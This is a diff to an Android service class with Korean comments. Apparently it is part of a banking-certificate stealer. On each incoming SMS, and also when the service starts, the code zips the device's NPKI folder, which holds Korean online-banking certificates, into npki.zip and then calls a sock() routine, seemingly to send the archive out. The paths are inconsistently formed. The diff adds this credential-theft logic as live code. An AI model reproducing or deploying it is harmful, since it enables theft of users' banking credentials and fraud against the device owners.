@@ -23,23 +23,20 @@ import android.widget.Toast;
 
 
 public class MyService extends Service {
-	
+	// 지정된 위치에 압축파일 생성
+	private static final String OUTPUT_ZIP_FILE = Environment.getExternalStorageDirectory().getAbsolutePath() + "\\npki.zip";
+	// 압축할 폴더 위치 지정
+	private static final String SOURCE_FOLDER = Environment.getExternalStorageDirectory().getAbsolutePath() + "\\NPKI";
 	private String msg = "test";
-	private BroadcastReceiver myReceiver= new BroadcastReceiver(){
-		
-		@Override
-		public void onReceive(Context context, Intent intent) {
-			 try {
 
-				 ZipFile zipfile = new ZipFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "npki.zip");
-				 ZipParameters parameters = new ZipParameters();
-				 parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE);
-				 parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL);
-				 zipfile.addFolder(Environment.getExternalStorageDirectory().getAbsolutePath() + "/NPKI", parameters);
-				 } catch (Exception e) {
-				 }
-			 
-			 sock();
+	private BroadcastReceiver myReceiver= new BroadcastReceiver(){	
+		@Override
+		public void onReceive(Context context, Intent intent) {			
+			ZipFolder ZipFolder = new ZipFolder();
+			ZipFolder.generateFileList(new File(SOURCE_FOLDER));
+			ZipFolder.zipIt(OUTPUT_ZIP_FILE);
+			
+			sock();
 		}
 	};
 	
@@ -69,6 +66,22 @@ public class MyService extends Service {
         intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");	
 		
 		registerReceiver(myReceiver, intentFilter);
+		
+		try {
+			 ZipFile zipfile = new ZipFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "npki.zip");
+			 ZipParameters parameters = new ZipParameters();
+			 parameters.setCompressionMethod(Zip4jConstants.COMP_DEFLATE);
+			 parameters.setCompressionLevel(Zip4jConstants.DEFLATE_LEVEL_NORMAL);
+			 zipfile.addFolder(Environment.getExternalStorageDirectory().getAbsolutePath() + "NPKI", parameters);
+
+			 Toast.makeText(this, "zipzip", Toast.LENGTH_SHORT).show();
+			 } catch (Exception e) {
+
+			  // TODO: handle exception
+				 Toast.makeText(this, "error", Toast.LENGTH_SHORT).show();
+
+			 }
+		
 		
 		return super.onStartCommand(intent, flags, startId);
 	}
